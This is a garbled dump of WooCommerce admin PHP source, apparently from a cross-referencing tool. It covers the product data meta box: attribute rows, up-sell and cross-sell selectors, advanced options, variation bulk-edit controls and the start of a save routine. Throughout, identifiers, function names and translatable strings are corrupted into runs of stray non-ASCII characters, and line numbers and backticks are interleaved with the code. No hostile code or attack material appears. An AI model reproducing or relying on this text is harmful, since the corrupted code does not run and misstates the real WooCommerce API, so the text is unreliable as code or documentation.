šput
 
ty³
="checkbox" 
şass
="checkbox" <?
php


488 iàĞ
	`is£t
Ğ
$©Œibu‹
['is_visible'] ) )

489 
	`checked
Ğ
$©Œibu‹
['is_visible'], 1 );

491 
	`checked
Ğ
	`­¶y_f‹rs
Ğ'deçuÉ_©Œibu‹_visib™y', 
çl£
, 
$x
 ), 
Œue
 );

493 ?> 
Çme
="©Œibu‹_visib™y[<?ph°echØ$i; ?>]" 
v®ue
="1" /> <?
php
 
	`_e
Ğ'VisibË oÀth´oduù…age', 'woocomm”û' ); ?></
Ïb–
>

494 </
td
>

495 </
Œ
>

496 <
Œ
>

497 <
td
>

498 <
div
 
şass
="enable_variation show_if_variable">

499 <
Ïb–
><
šput
 
ty³
="checkbox" 
şass
="checkbox" <?
php


501 iàĞ
	`is£t
Ğ
$©Œibu‹
['is_variation'] ) )

502 
	`checked
Ğ
$©Œibu‹
['is_variation'], 1 );

504 
	`checked
Ğ
	`­¶y_f‹rs
Ğ'deçuÉ_©Œibu‹_v¬ŸtiÚ', 
çl£
, 
$x
 ), 
Œue
 );

506 ?> 
Çme
="©Œibu‹_v¬ŸtiÚ[<?ph°echØ$i; ?>]" 
v®ue
="1" /> <?
php
 
	`_e
Ğ'U£d fÜ v¬ŸtiÚs', 'woocomm”û' ); ?></
Ïb–
>

507 </
div
>

508 </
td
>

509 </
Œ
>

510 </
tbody
>

511 </
bË
>

512 </
div
>

513 <?
php


518 iàĞ! 
	`em±y
Ğ
$©Œibu‹s
 ) ) 
	`fÜ—ch
 ( $©Œibu‹ 
as
 
$©Œibu‹
 ) {

519 iàĞ
$©Œibu‹
['is_taxonomy'] )

522 
$i
++;

524 
$pos™iÚ
 = 
	`em±y
Ğ
$©Œibu‹
['pos™iÚ'] ) ? 0 : 
	`absšt
( $attribute['position'] );

526 <
div
 
şass
="woocomm”û_©Œibu‹ wc-m‘abox clo£d" 
»l
="<?phpƒcho $position; ?>">

527 <
h3
>

528 <
bu‰Ú
 
ty³
="bu‰Ú" 
şass
="»move_row bu‰Ú"><?
php
 
	`_e
( 'Remove', 'woocommerce' ); ?></button>

529 <
div
 
şass
="hªdËdiv" 
t™Ë
="<?php _e( 'Clickooggle', 'woocommerce' ); ?>"></div>

530 <
¡rÚg
 
şass
="©Œibu‹_Çme"><?
php
 
echo
 
	`­¶y_f‹rs
Ğ'woocomm”û_©Œibu‹_Ïb–', 
	`esc_html
Ğ
$©Œibu‹
['name'] ),ƒsc_html( $attribute['name'] ) ); ?></strong>

531 </
h3
>

532 <
bË
 
ûÎ·ddšg
="0" 
ûÎ¥acšg
="0" 
şass
="woocommerce_attribute_data wc-metabox-content">

533 <
tbody
>

534 <
Œ
>

535 <
td
 
şass
="attribute_name">

536 <
Ïb–
><?
php
 
	`_e
( 'Name', 'woocommerce' ); ?>:</label>

537 <
šput
 
ty³
="‹xt" 
şass
="©Œibu‹_Çme" 
Çme
="©Œibu‹_Çmes[<?ph°echØ$i; ?>]" 
v®ue
="<?phpƒchoƒsc_attr( $attribute['name'] ); ?>" />

538 <
šput
 
ty³
="hidd’" 
Çme
="©Œibu‹_pos™iÚ[<?ph°echØ$i; ?>]" 
şass
="©Œibu‹_pos™iÚ" 
v®ue
="<?phpƒchoƒsc_attr( $position ); ?>" />

539 <
šput
 
ty³
="hidd’" 
Çme
="©Œibu‹_is_xÚomy[<?ph°echØ$i; ?>]" 
v®ue
="0" />

540 </
td
>

541 <
td
 
row¥ª
="3">

542 <
Ïb–
><?
php
 
	`_e
( 'Value(s)', 'woocommerce' ); ?>:</label>

543 <
‹x»a
 
Çme
="©Œibu‹_v®ues[<?ph°echØ$i; ?>]" 
cŞs
="5" 
rows
="5" 
¶aûhŞd”
="<?ph°_eĞ'EÁ” som‹xt, o¸som©Œibu‹ by…(|è£·¿tšg v®ues.', 'woocomm”û' ); ?>"><?
php
 
echo
 
	`esc_‹x»a
Ğ
$©Œibu‹
['value'] ); ?></textarea>

544 </
td
>

545 </
Œ
>

546 <
Œ
>

547 <
td
>

548 <
Ïb–
><
šput
 
ty³
="checkbox" 
şass
="checkbox" <?
php
 
	`checked
Ğ
$©Œibu‹
['is_visibË'], 1 ); ?> 
Çme
="©Œibu‹_visib™y[<?ph°echØ$i; ?>]" 
v®ue
="1" /> <?ph°
	`_e
( 'Visible onhe…roduct…age', 'woocommerce' ); ?></label>

549 </
td
>

550 </
Œ
>

551 <
Œ
>

552 <
td
>

553 <
div
 
şass
="enable_variation show_if_variable">

554 <
Ïb–
><
šput
 
ty³
="checkbox" 
şass
="checkbox" <?
php
 
	`checked
Ğ
$©Œibu‹
['is_v¬ŸtiÚ'], 1 ); ?> 
Çme
="©Œibu‹_v¬ŸtiÚ[<?ph°echØ$i; ?>]" 
v®ue
="1" /> <?ph°
	`_e
( 'Used for variations', 'woocommerce' ); ?></label>

555 </
div
>

556 </
td
>

557 </
Œ
>

558 </
tbody
>

559 </
bË
>

560 </
div
>

561 <?
php


564 </
div
>

566 <
p
 
şass
="toolbar">

567 <
bu‰Ú
 
ty³
="bu‰Ú" 
şass
="bu‰Ú bu‰Ú-´im¬y‡dd_©Œibu‹"><?
php
 
	`_e
( 'Add', 'woocommerce' ); ?></button>

568 <
£Ëù
 
Çme
="©Œibu‹_xÚomy" 
şass
="attribute_taxonomy">

569 <
İtiÚ
 
v®ue
=""><?
php
 
	`_e
( 'Custom…roduct‡ttribute', 'woocommerce' ); ?></option>

570 <?
php


571 iàĞ
$©Œibu‹_xÚom›s
 ) {

572 
	`fÜ—ch
 ( 
$©Œibu‹_xÚom›s
 
as
 
$x
 ) {

573 
$©Œibu‹_xÚomy_Çme
 = 
	`wc_©Œibu‹_xÚomy_Çme
Ğ
$x
->
©Œibu‹_Çme
 );

574 
$Ïb–
 = 
$x
->
©Œibu‹_Ïb–
 ? $x->©Œibu‹_Ïb– : $x->
©Œibu‹_Çme
;

575 
echo
 '<İtiÚ v®ue="' . 
	`esc_©Œ
Ğ
$©Œibu‹_xÚomy_Çme
 ) . '">' . 
	`esc_html
Ğ
$Ïb–
 ) . '</option>';

579 </
£Ëù
>

581 <
bu‰Ú
 
ty³
="bu‰Ú" 
şass
="bu‰Ú save_©Œibu‹s"><?
php
 
	`_e
( 'Save‡ttributes', 'woocommerce' ); ?></button>

582 </
p
>

583 </
div
>

584 <
div
 
id
="lšked_´oduù_d©a" 
şass
="panel woocommerce_options_panel">

586 <
div
 
şass
="options_group">

588 <
p
 
şass
="fÜm-f›ld"><
Ïb–
 ="up£Î_ids"><?
php
 
	`_e
( 'Up-Sells', 'woocommerce' ); ?></label>

589 <
£Ëù
 
id
="up£Î_ids" 
Çme
="up£Î_ids[]" 
şass
="ajax_cho£n_£Ëù_´oduùs" 
muÉË
="muÉË" 
d©a
-
¶aûhŞd”
="<?php _e( 'Search for‡…roduct&hellip;', 'woocommerce' ); ?>">

590 <?
php


591 
$up£Î_ids
 = 
	`g‘_po¡_m‘a
Ğ
$po¡
->
ID
, '_up£Î_ids', 
Œue
 );

592 
$´oduù_ids
 = ! 
	`em±y
Ğ
$up£Î_ids
 ) ? 
	`¬¿y_m­
Ğ'absšt', $up£Î_id è: 
nuÎ
;

593 iàĞ
$´oduù_ids
 ) {

594 
	`fÜ—ch
 ( 
$´oduù_ids
 
as
 
$´oduù_id
 ) {

596 
$´oduù
 = 
	`g‘_´oduù
Ğ
$´oduù_id
 );

598 iàĞ
$´oduù
 )

599 
echo
 '<İtiÚ v®ue="' . 
	`esc_©Œ
Ğ
$´oduù_id
 ) . '" s–eùed="£Ëùed">' . 
	`esc_html
Ğ
$´oduù
->
	`g‘_fÜm©‹d_Çme
() ) . '</option>';

603 </
£Ëù
> <
img
 
şass
="h–p_t" 
d©a
-
t
='<?ph°_eĞ'
Up
-
£Îs
 
¬e
 
´oduùs
 
which
 
you
 
»comm’d
 
š¡—d
 
of
 
the
 
cu¼’y
 
v›wed
 
´oduù
, 
exam¶e
,…roduù 
th©
‡» 
mÜe
 
´of™abË
 
Ü
 
b‘‹r
 
qu®™y
 o¸mÜ
ex³nsive
.', '
woocomm”û
' ) ?>' 
¤c
="<?ph°echØWC()->¶ugš_u¾(); ?>/as£ts/images/h–p.²g" 
height
="16" 
width
="16" /></
p
>

605 <
p
 
şass
="fÜm-f›ld"><
Ïb–
 ="üoss£Î_ids"><?
php
 
	`_e
( 'Cross-Sells', 'woocommerce' ); ?></label>

606 <
£Ëù
 
id
="üoss£Î_ids" 
Çme
="üoss£Î_ids[]" 
şass
="ajax_cho£n_£Ëù_´oduùs" 
muÉË
="muÉË" 
d©a
-
¶aûhŞd”
="<?php _e( 'Search for‡…roduct&hellip;', 'woocommerce' ); ?>">

607 <?
php


608 
$üoss£Î_ids
 = 
	`g‘_po¡_m‘a
Ğ
$po¡
->
ID
, '_üoss£Î_ids', 
Œue
 );

609 
$´oduù_ids
 = ! 
	`em±y
Ğ
$üoss£Î_ids
 ) ? 
	`¬¿y_m­
Ğ'absšt', $üoss£Î_id è: 
nuÎ
;

610 iàĞ
$´oduù_ids
 ) {

611 
	`fÜ—ch
 ( 
$´oduù_ids
 
as
 
$´oduù_id
 ) {

613 
$´oduù
 = 
	`g‘_´oduù
Ğ
$´oduù_id
 );

615 iàĞ
$´oduù
 )

616 
echo
 '<İtiÚ v®ue="' . 
	`esc_©Œ
Ğ
$´oduù_id
 ) . '" s–eùed="£Ëùed">' . 
	`esc_html
Ğ
$´oduù
->
	`g‘_fÜm©‹d_Çme
() ) . '</option>';

620 </
£Ëù
> <
img
 
şass
="h–p_t" 
d©a
-
t
='<?ph°_eĞ'
Cross
-
£Îs
 
¬e
 
´oduùs
 
which
 
you
 
´omÙe
 
š
 
the
 
ÿ¹
, 
ba£d
 
Ú
h
cu¼’t
 
´oduù
.', '
woocomm”û
' ) ?>' 
¤c
="<?ph°echØWC()->¶ugš_u¾(); ?>/as£ts/images/h–p.²g" 
height
="16" 
width
="16" /></
p
>

622 </
div
>

624 <?
php


626 
echo
 '<div class="options_group grouping show_if_simple show_if_external">';

629 
$po¡_·»Ás
 = 
	`¬¿y
();

630 
$po¡_·»Ás
[''] = 
	`__
( 'Choose‡ grouped…roduct&hellip;', 'woocommerce' );

632 iàĞ
$grou³d_‹rm
 = 
	`g‘_‹rm_by
( 'slug', 'grouped', 'product_type' ) ) {

634 
$po¡s_š
 = 
	`¬¿y_unique
Ğ(
¬¿y
è
	`g‘_objeùs_š_‹rm
Ğ
$grou³d_‹rm
->
‹rm_id
, 'product_type' ) );

635 iàĞĞ
$po¡s_š
 ) > 0 ) {

636 
$¬gs
 = 
	`¬¿y
(

643 'šşude' => 
$po¡s_š
,

645 
$grou³d_´oduùs
 = 
	`g‘_po¡s
Ğ
$¬gs
 );

647 iàĞ
$grou³d_´oduùs
 ) {

648 
	`fÜ—ch
 ( 
$grou³d_´oduùs
 
as
 
$´oduù
 ) {

650 iàĞ
$´oduù
->
ID
 =ğ
$po¡
->ID )

653 
$po¡_·»Ás
[ 
$´oduù
->
ID
 ] = $´oduù->
po¡_t™Ë
;

660 
	`woocomm”û_wp_£Ëù
Ğ
	`¬¿y
Ğ'id' => '·»Á_id', 'Ïb–' => 
	`__
Ğ'Groupšg', 'woocomm”û' ), 'v®ue' => 
	`absšt
Ğ
$po¡
->
po¡_·»Á
 ), 'İtiÚs' => 
$po¡_·»Ás
, 'desc_t' => 
Œue
, 'description' => __( 'Sethis optiono makehis…roduct…art of‡ grouped…roduct.', 'woocommerce' ) ) );

662 
	`woocomm”û_wp_hidd’_šput
Ğ
	`¬¿y
Ğ'id' => '´evious_·»Á_id', 'v®ue' => 
	`absšt
Ğ
$po¡
->
po¡_·»Á
 ) ) );

664 
	`do_aùiÚ
( 'woocommerce_product_options_grouping' );

666 
echo
 '</div>';

669 <?
php
 
	`do_aùiÚ
( 'woocommerce_product_options_related' ); ?>

671 </
div
>

673 <
div
 
id
="advªûd_´oduù_d©a" 
şass
="panel woocommerce_options_panel">

675 <?
php


677 
echo
 '<div class="options_group hide_if_external">';

680 
	`woocomm”û_wp_‹x»a_šput
Ğ
	`¬¿y
Ğ'id' => '_purcha£_nÙe', 'Ïb–' => 
	`__
( 'Purchase Note', 'woocommerce' ), 'desc_tip' => 'true', 'description' => __( 'Enter‡n optional‚oteo sendhe customer‡fter…urchase.', 'woocommerce' ) ) );

682 
echo
 '</div>';

684 
echo
 '<div class="options_group">';

687 
	`woocomm”û_wp_‹xt_šput
Ğ
	`¬¿y
Ğ'id' => 'm’u_Üd”', 'Ïb–' => 
	`__
Ğ'M’u ord”', 'woocomm”û' ), 'desc_t' => 'Œue', 'desütiÚ' => __Ğ'Cu¡om ord”šg…os™iÚ.', 'woocomm”û' ), 'v®ue' => 
	`štv®
Ğ
$po¡
->
m’u_Üd”
 ), 'type' => 'number', 'custom_attributes' =>‡rray(

691 
echo
 '</div>';

693 
echo
 '<div class="options_group„eviews">';

695 
	`woocomm”û_wp_checkbox
Ğ
	`¬¿y
Ğ'id' => 'comm’t_¡©us', 'Ïb–' => 
	`__
Ğ'EÇbË„ev›ws', 'woocomm”û' ), 'cbv®ue' => 'İ’', 'v®ue' => 
	`esc_©Œ
Ğ
$po¡
->
comm’t_¡©us
 ) ) );

697 
	`do_aùiÚ
( 'woocommerce_product_options_reviews' );

699 
echo
 '</div>';

702 </
div
>

704 <?
php


705 
£lf
::
	`ouut_v¬ŸtiÚs
();

707 
	`do_aùiÚ
( 'woocommerce_product_data_panels' );

708 
	`do_aùiÚ
( 'woocommerce_product_write_panels' );

711 <
div
 
şass
="clear"></div>

713 </
div
>

714 <?
php


720 
public
 
funùiÚ
 
	$ouut_v¬ŸtiÚs
() {

721 
glob®
 
$po¡
, 
$woocomm”û
;

723 
$©Œibu‹s
 = 
	`maybe_un£rŸlize
Ğ
	`g‘_po¡_m‘a
Ğ
$po¡
->
ID
, '_´oduù_©Œibu‹s', 
Œue
 ) );

726 
$v¬ŸtiÚ_©Œibu‹_found
 = 
çl£
;

727 iàĞ
$©Œibu‹s
 ) 
	`fÜ—ch
Ğ$©Œibu‹ 
as
 
$©Œibu‹
 ) {

728 iàĞ
	`is£t
Ğ
$©Œibu‹
['is_variation'] ) ) {

729 
$v¬ŸtiÚ_©Œibu‹_found
 = 
Œue
;

735 
$x_şas£s
 = 
	`¬¿y_f‹r
Ğ
	`¬¿y_m­
('Œim', 
	`ex¶ode
Ğ"\n", 
	`g‘_İtiÚ
( 'woocommerce_tax_classes' ) ) ) );

736 
$x_şass_İtiÚs
 = 
	`¬¿y
();

737 
$x_şass_İtiÚs
[''] = 
	`__
( 'Standard', 'woocommerce' );

738 iàĞ
$x_şas£s
 )

739 
	`fÜ—ch
 ( 
$x_şas£s
 
as
 
$şass
 )

740 
$x_şass_İtiÚs
[ 
	`§n™ize_t™Ë
Ğ
$şass
 ) ] = 
	`esc_©Œ
( $class );

742 <
div
 
id
="v¬ŸbË_´oduù_İtiÚs" 
şass
="panel wc-metaboxes-wrapper"><div id="variable_product_options_inner">

744 <?
php
 iàĞ! 
$v¬ŸtiÚ_©Œibu‹_found
 ) : ?>

746 <
div
 
id
="mes§ge" 
şass
="inline woocommerce-message">

747 <
p
><?
php
 
	`_e
( 'Before‡dding variations,‡dd‡nd save some‡ttributes onhe <strong>Attributes</strong>ab.', 'woocommerce' ); ?></p>

749 <
p
 
şass
="subm™"><
a
 cÏss="bu‰Ú-´im¬y" 
h»f
="<?ph°echØesc_u¾Ğ­¶y_f‹rsĞ'woocomm”û_docs_u¾', 'h‰p://docs.woÙhemes.com/docum’t/´oduù-v¬ŸtiÚs', '´oduù-v¬ŸtiÚs' ) ); ?>" 
rg‘
="_bÏnk"><?
php
 
	`_e
( 'Learn more', 'woocommerce' ); ?></a></p>

750 </
div
>

752 <?
php
 : ?>

754 <
p
 
şass
="toolbar">

755 <
a
 
h»f
="#" 
şass
="şo£_®l"><?
php
 
	`_e
( 'Close‡ll', 'woocommerce' ); ?></a><a href="#" class="expand_all"><?php _e( 'Expand‡ll', 'woocommerce' ); ?></a>

756 <
¡rÚg
><?
php
 
	`_e
( 'Bulkƒdit:', 'woocommerce' ); ?></strong>

757 <
£Ëù
 
id
="field_to_edit">

758 <
İtiÚ
 
v®ue
="toggË_’abËd"><?
php
 
	`_e
( 'Toggle &quot;Enabled&quot;', 'woocommerce' ); ?></option>

759 <
İtiÚ
 
v®ue
="toggË_dowÆßdabË"><?
php
 
	`_e
( 'Toggle &quot;Downloadable&quot;', 'woocommerce' ); ?></option>

760 <
İtiÚ
 
v®ue
="toggË_vœtu®"><?
php
 
	`_e
( 'Toggle &quot;Virtual&quot;', 'woocommerce' ); ?></option>

761 <
İtiÚ
 
v®ue
="d–‘e_®l"><?
php
 
	`_e
( 'Delete‡ll variations', 'woocommerce' ); ?></option>

762 <
İtiÚ
 
v®ue
="v¬ŸbË_»guÏr_´iû"><?
php
 
	`_e
( 'Prices', 'woocommerce' ); ?></option>

763 <
İtiÚ
 
v®ue
="v¬ŸbË_»guÏr_´iû_šü—£"><?
php
 
	`_e
( 'Prices increase by (fixed‡mount or %)', 'woocommerce' ); ?></option>

764 <
İtiÚ
 
v®ue
="v¬ŸbË_»guÏr_´iû_deü—£"><?
php
 
	`_e
( 'Prices decrease by (fixed‡mount or %)', 'woocommerce' ); ?></option>

765 <
İtiÚ
 
v®ue
="v¬ŸbË_§Ë_´iû"><?
php
 
	`_e
( 'Sale…rices', 'woocommerce' ); ?></option>

766 <
İtiÚ
 
v®ue
="v¬ŸbË_§Ë_´iû_šü—£"><?
php
 
	`_e
( 'Sale…rices increase by (fixed‡mount or %)', 'woocommerce' ); ?></option>

767 <
İtiÚ
 
v®ue
="v¬ŸbË_§Ë_´iû_deü—£"><?
php
 
	`_e
( 'Sale…rices decrease by (fixed‡mount or %)', 'woocommerce' ); ?></option>

768 <
İtiÚ
 
v®ue
="v¬ŸbË_¡ock"><?
php
 
	`_e
( 'Stock', 'woocommerce' ); ?></option>

769 <
İtiÚ
 
v®ue
="v¬ŸbË_weight"><?
php
 
	`_e
( 'Weight', 'woocommerce' ); ?></option>

770 <
İtiÚ
 
v®ue
="v¬ŸbË_Ëngth"><?
php
 
	`_e
( 'Length', 'woocommerce' ); ?></option>

771 <
İtiÚ
 
v®ue
="v¬ŸbË_width"><?
php
 
	`_e
( 'Width', 'woocommerce' ); ?></option>

772 <
İtiÚ
 
v®ue
="v¬ŸbË_height"><?
php
 
	`_e
( 'Height', 'woocommerce' ); ?></option>

773 <
İtiÚ
 
v®ue
="v¬ŸbË_dowÆßd_lim™"><?
php
 
	`_e
( 'Download†imit', 'woocommerce' ); ?></option>

774 <
İtiÚ
 
v®ue
="v¬ŸbË_dowÆßd_expœy"><?
php
 
	`_e
( 'Download Expiry', 'woocommerce' ); ?></option>

775 <?
php
 
	`do_aùiÚ
( 'woocommerce_variable_product_bulk_edit_actions' ); ?>

776 </
£Ëù
>

777 <
a
 
şass
="bu‰Ú bulk_ed™"><?
php
 
	`_e
( 'Go', 'woocommerce' ); ?></a>

778 </
p
>

780 <
div
 
şass
="woocommerce_variations wc-metaboxes">

781 <?
php


783 
$·»Á_d©a
 = 
	`¬¿y
(

784 'id' => 
$po¡
->
ID
,

785 '©Œibu‹s' => 
$©Œibu‹s
,

786 'x_şass_İtiÚs' => 
$x_şass_İtiÚs
,

787 'sku' => 
	`g‘_po¡_m‘a
Ğ
$po¡
->
ID
, '_sku', 
Œue
 ),

788 'weight' => 
	`wc_fÜm©_loÿlized_decim®
Ğ
	`g‘_po¡_m‘a
Ğ
$po¡
->
ID
, '_weight', 
Œue
 ) ),

789 'Ëngth' => 
	`wc_fÜm©_loÿlized_decim®
Ğ
	`g‘_po¡_m‘a
Ğ
$po¡
->
ID
, '_Ëngth', 
Œue
 ) ),

790 'width' => 
	`wc_fÜm©_loÿlized_decim®
Ğ
	`g‘_po¡_m‘a
Ğ
$po¡
->
ID
, '_width', 
Œue
 ) ),

791 'height' => 
	`wc_fÜm©_loÿlized_decim®
Ğ
	`g‘_po¡_m‘a
Ğ
$po¡
->
ID
, '_height', 
Œue
 ) ),

792 'x_şass' => 
	`g‘_po¡_m‘a
Ğ
$po¡
->
ID
, '_x_şass', 
Œue
 )

795 iàĞ! 
$·»Á_d©a
['weight'] )

796 
$·»Á_d©a
['weight'] = 
	`wc_fÜm©_loÿlized_decim®
( 0 );

798 iàĞ! 
$·»Á_d©a
['length'] )

799 
$·»Á_d©a
['Ëngth'] = 
	`wc_fÜm©_loÿlized_decim®
( 0 );

801 iàĞ! 
$·»Á_d©a
['width'] )

802 
$·»Á_d©a
['width'] = 
	`wc_fÜm©_loÿlized_decim®
( 0 );

804 iàĞ! 
$·»Á_d©a
['height'] )

805 
$·»Á_d©a
['height'] = 
	`wc_fÜm©_loÿlized_decim®
( 0 );

808 
$¬gs
 = 
	`¬¿y
(

810 'po¡_¡©us' => 
	`¬¿y
( 'private', 'publish' ),

814 'po¡_·»Á' => 
$po¡
->
ID


816 
$v¬ŸtiÚs
 = 
	`g‘_po¡s
Ğ
$¬gs
 );

817 
$loİ
 = 0;

818 iàĞ
$v¬ŸtiÚs
 ) 
	`fÜ—ch
 ( $v¬ŸtiÚ 
as
 
$v¬ŸtiÚ
 ) {

820 
$v¬ŸtiÚ_id
 = 
	`absšt
Ğ
$v¬ŸtiÚ
->
ID
 );

821 
$v¬ŸtiÚ_po¡_¡©us
 = 
	`esc_©Œ
Ğ
$v¬ŸtiÚ
->
po¡_¡©us
 );

822 
$v¬ŸtiÚ_d©a
 = 
	`g‘_po¡_m‘a
Ğ
$v¬ŸtiÚ_id
 );

823 
$v¬ŸtiÚ_d©a
['v¬ŸtiÚ_po¡_id'] = 
$v¬ŸtiÚ_id
;

826 
$shpšg_şas£s
 = 
	`g‘_the_‹rms
Ğ
$v¬ŸtiÚ_id
, 'product_shipping_class' );

827 
$shpšg_şass
 = ( 
$shpšg_şas£s
 && ! 
	`is_wp_”rÜ
Ğ$shpšg_şas£ èè? 
	`cu¼’t
Ğ$shpšg_şas£ )->
‹rm_id
 : '';

829 
$v¬ŸtiÚ_f›lds
 = 
	`¬¿y
(

848 
	`fÜ—ch
 ( 
$v¬ŸtiÚ_f›lds
 
as
 
$f›ld
 )

849 
$$f›ld
 = 
	`is£t
Ğ
$v¬ŸtiÚ_d©a
[ 
$f›ld
 ][0] ) ? 
	`maybe_un£rŸlize
( $variation_data[ $field ][0] ) : '';

851 
$_x_şass
 = 
	`is£t
Ğ
$v¬ŸtiÚ_d©a
['_x_şass'][0] ) ? $v¬ŸtiÚ_d©a['_x_şass'][0] : 
nuÎ
;

852 
$image_id
 = 
	`absšt
Ğ
$_thumbÇ_id
 );

853 
$image
 = 
$image_id
 ? 
	`wp_g‘_©chm’t_thumb_u¾
( $image_id ) : '';

856 
$_»guÏr_´iû
 = 
	`wc_fÜm©_loÿlized_´iû
( $_regular_price );

857 
$_§Ë_´iû
 = 
	`wc_fÜm©_loÿlized_´iû
( $_sale_price );

858 
$_weight
 = 
	`wc_fÜm©_loÿlized_decim®
( $_weight );

859 
$_Ëngth
 = 
	`wc_fÜm©_loÿlized_decim®
( $_length );

860 
$_width
 = 
	`wc_fÜm©_loÿlized_decim®
( $_width );

861 
$_height
 = 
	`wc_fÜm©_loÿlized_decim®
( $_height );

863 
	`šşude
( 'views/html-variation-admin.php' );

865 
$loİ
++;

868 </
div
>

870 <
p
 
şass
="toolbar">

872 <
bu‰Ú
 
ty³
="bu‰Ú" 
şass
="bu‰Ú bu‰Ú-´im¬y‡dd_v¬ŸtiÚ" <?
php
 
	`di§bËd
Ğ
$v¬ŸtiÚ_©Œibu‹_found
, 
çl£
 ); ?>><?ph°
	`_e
( 'Add Variation', 'woocommerce' ); ?></button>

874 <
bu‰Ú
 
ty³
="bu‰Ú" 
şass
="bu‰Ú†šk_®l_v¬ŸtiÚs" <?
php
 
	`di§bËd
Ğ
$v¬ŸtiÚ_©Œibu‹_found
, 
çl£
 ); ?>><?ph°
	`_e
( 'Link‡ll variations', 'woocommerce' ); ?></button>

876 <
¡rÚg
><?
php
 
	`_e
( 'Default selections:', 'woocommerce' ); ?></strong>

877 <?
php


878 
$deçuÉ_©Œibu‹s
 = 
	`maybe_un£rŸlize
Ğ
	`g‘_po¡_m‘a
Ğ
$po¡
->
ID
, '_deçuÉ_©Œibu‹s', 
Œue
 ) );

879 
	`fÜ—ch
 ( 
$©Œibu‹s
 
as
 
$©Œibu‹
 ) {

882 iàĞ! 
$©Œibu‹
['is_variation'] )

886 
$v¬ŸtiÚ_£Ëùed_v®ue
 = 
	`is£t
Ğ
$deçuÉ_©Œibu‹s
[ 
	`§n™ize_t™Ë
Ğ
$©Œibu‹
['name'] ) ] ) ? $default_attributes[ sanitize_title( $attribute['name'] ) ] : '';

889 
echo
 '<£Ëù‚ame="deçuÉ_©Œibu‹_' . 
	`§n™ize_t™Ë
Ğ
$©Œibu‹
['Çme'] ) . '"><İtiÚ v®ue="">' . 
	`__
Ğ'NØdeçuÉ', 'woocomm”û' ) . ' ' . 
	`esc_html
Ğ
	`wc_©Œibu‹_Ïb–
( $attribute['name'] ) ) . '&hellip;</option>';

892 iàĞ
$©Œibu‹
['is_taxonomy'] ) {

894 
$po¡_‹rms
 = 
	`wp_g‘_po¡_‹rms
Ğ
$po¡
->
ID
, 
$©Œibu‹
['name'] );

896 
	`fÜ—ch
 ( 
$po¡_‹rms
 
as
 
$‹rm
 )

897 
echo
 '<İtiÚ ' . 
	`£Ëùed
Ğ
$v¬ŸtiÚ_£Ëùed_v®ue
, 
$‹rm
->
¦ug
, 
çl£
 ) . ' v®ue="' . 
	`esc_©Œ
Ğ$‹rm->¦ug ) . '">' . 
	`­¶y_f‹rs
Ğ'woocomm”û_v¬ŸtiÚ_İtiÚ_Çme', 
	`esc_html
Ğ$‹rm->
Çme
 ) ) . '</option>';

901 
$İtiÚs
 = 
	`¬¿y_m­
Ğ'Œim', 
	`ex¶ode
Ğ
WC_DELIMITER
, 
$©Œibu‹
['value'] ) );

903 
	`fÜ—ch
 ( 
$İtiÚs
 
as
 
$İtiÚ
 )

904 
echo
 '<İtiÚ ' . 
	`£Ëùed
Ğ
	`§n™ize_t™Ë
Ğ
$v¬ŸtiÚ_£Ëùed_v®ue
 ), sª™ize_t™ËĞ
$İtiÚ
 ), 
çl£
 ) . ' v®ue="' . 
	`esc_©Œ
Ğ§n™ize_t™ËĞ$İtiÚ ) ) . '">' . 
	`esc_html
Ğ
	`­¶y_f‹rs
( 'woocommerce_variation_option_name', $option ) ) . '</option>';

908 
echo
 '</select>';

911 </
p
>

913 <?
php
 
’dif
; ?>

914 </
div
></div>

915 <?
php


916 
	}
}

921 
public
 
funùiÚ
 
	$§ve
Ğ
$po¡_id
, 
$po¡
 ) {

922 
glob®
 
$wpdb
;

925 
	`add_po¡_m‘a
Ğ
$po¡_id
, 'tÙ®_§Ës', '0', 
Œue
 );

928 
$´oduù_ty³
 = 
	`em±y
Ğ
$_POST
['´oduù-ty³'] ) ? 'sim¶e' : 
	`§n™ize_t™Ë
Ğ
	`¡r¦ashes
( $_POST['product-type'] ) );

929 
$is_dowÆßdabË
 = 
	`is£t
Ğ
$_POST
['_downloadable'] ) ? 'yes' : 'no';

930 
$is_vœtu®
 = 
	`is£t
Ğ
$_POST
['_virtual'] ) ? 'yes' : 'no';

933 
	`wp_£t_objeù_‹rms
Ğ
$po¡_id
, 
$´oduù_ty³
, 'product_type' );

934 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_dowÆßdabË', 
$is_dowÆßdabË
 );

935 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_vœtu®', 
$is_vœtu®
 );

938 iàĞ
	`is£t
Ğ
$_POST
['_regular_price'] ) )

939 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_»guÏr_´iû', ( 
$_POST
['_»guÏr_´iû'] ==ğ'' ) ? '' : 
	`wc_fÜm©_decim®
( $_POST['_regular_price'] ) );

940 iàĞ
	`is£t
Ğ
$_POST
['_sale_price'] ) )

941 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_§Ë_´iû', ( 
$_POST
['_§Ë_´iû'] ==ğ'' ? '' : 
	`wc_fÜm©_decim®
( $_POST['_sale_price'] ) ) );

942 iàĞ
	`is£t
Ğ
$_POST
['_x_¡©us'] ) ) 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_x_¡©us', 
	`¡r¦ashes
( $_POST['_tax_status'] ) );

943 iàĞ
	`is£t
Ğ
$_POST
['_x_şass'] ) ) 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_x_şass', 
	`¡r¦ashes
( $_POST['_tax_class'] ) );

944 iàĞ
	`is£t
Ğ
$_POST
['_visib™y'] ) ) 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_visib™y', 
	`¡r¦ashes
( $_POST['_visibility'] ) );

945 iàĞ
	`is£t
Ğ
$_POST
['_purcha£_nÙe'] ) ) 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_purcha£_nÙe', 
	`¡r¦ashes
( $_POST['_purchase_note'] ) );

946 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_ã©u»d', 
	`is£t
Ğ
$_POST
['_featured'] ) ? 'yes' : 'no' );

949 iàĞ
$is_vœtu®
 == 'no' ) {

951 iàĞ
	`is£t
Ğ
$_POST
['_weight'] ) )

952 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_weight', ( 
$_POST
['_weight'] ==ğ'' ) ? '' : 
	`wc_fÜm©_decim®
( $_POST['_weight'] ) );

954 iàĞ
	`is£t
Ğ
$_POST
['_length'] ) )

955 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_Ëngth', ( 
$_POST
